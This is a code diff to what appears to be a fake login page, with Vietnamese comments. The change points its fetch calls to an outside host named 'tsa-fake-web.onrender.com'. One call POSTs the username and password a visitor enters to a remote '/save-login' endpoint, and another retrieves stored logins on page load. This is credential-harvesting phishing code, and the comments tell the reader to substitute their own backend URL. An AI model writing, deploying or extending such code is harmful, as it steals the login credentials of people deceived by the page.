@@ -73,7 +73,7 @@
             const password = document.getElementById("password").value;
 
             // Gửi thông tin đăng nhập đến backend để lưu
-            fetch('/save-login', {
+            fetch('https://tsa-fake-web.onrender.com/save-login', { // Replace with your Render backend URL
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -93,7 +93,7 @@
 
         // Kiểm tra nếu có thông tin đăng nhập đã lưu và điền vào form
         window.onload = function() {
-            fetch('/get-login')
+            fetch('https://tsa-fake-web.onrender.com/get-login') // Replace with your Render backend URL
                 .then(response => {
                     if (response.status === 200) {
                         return response.json();
